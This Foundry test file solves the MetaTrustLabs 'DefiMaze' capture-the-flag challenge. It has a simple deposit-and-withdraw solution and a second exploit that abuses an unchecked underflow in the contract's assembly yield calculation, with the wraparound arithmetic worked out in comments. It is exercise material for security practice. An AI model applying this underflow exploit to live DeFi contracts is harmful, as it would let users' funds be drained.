// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./SetUp.sol";

/// https://github.com/MetaTrustLabs/ctf/blob/master/DefiMaze/contracts/SetUp.sol

contract DefiMazeTest is Test {
    SetUp internal _setup;

    function setUp() public {
        _setup = new SetUp();
    }

    /// @dev Easier solution:
    //       Deposits ethers directly
    function test_attack() public {
        _setup.platfrom().calculateYield(0, 0, 0);

        _setup.platfrom().depositFunds{value: 7e18}(7e18);

        _setup.platfrom().requestWithdrawal(7e18);

        _setup.vault().isSolved();

        assertTrue(_setup.isSolved());
    }

    /// @dev Complicated solution:
    ///      Underflow and overflow is possible in YUL,
    ///      calculates parameters then calls calculateYield.
    function test_attack2() public {
//        assembly {
//            let r := add(div(rate, 100), RATIO)
//            let t := exp(0x100000000000000000000000000000000, mul(time, 0x10000000000000000))
//            yieldAmount := div(mul(mul(principal, r), sub(t, RATIO)), mul(RATIO, RATIO))
//        }

        // calculateYield(uint256 principal, uint256 rate, uint256 time)
        // RATIO: 1e18
        // yieldAmount must >= 7e18
        //
        // r = rate / 100 + 1e18
        // t = 340282366920938463463374607431768211456 ** (time * 18446744073709551616)
        // yieldAmount = principal * r * (t - 1e18) / 1e36
        //
        // principle: 1
        //
        // rate: 0
        // min r = 1e18
        //
        // time = 0
        // t = 1
        // sub(t, RATIO):
        // 115792089237316195423570985008687907853269984665640564039456584007913129639937
        //
        // mul(mul(principal, r), sub(t, RATIO)):
        // 115792089237316195423570985008687907853268984665640564039458584007913129639936
        //
        // type(uint256).max:
        // 115792089237316195423570985008687907853269984665640564039457584007913129639935
        //
        // yieldAmount:
        // 1 * 1e18 * 115792089237316195423570985008687907853269984665640564039456584007913129639937 / 1e36
        // 115792089237316195423570985008687907853268984665640564039458584007913129639936 / 1e36
        // 115792089237316195423570985008687907853268

        _setup.platfrom().calculateYield(1, 0, 0);

        _setup.platfrom().requestWithdrawal(7e18);

        _setup.vault().isSolved();

        assertTrue(_setup.isSolved());
    }
}
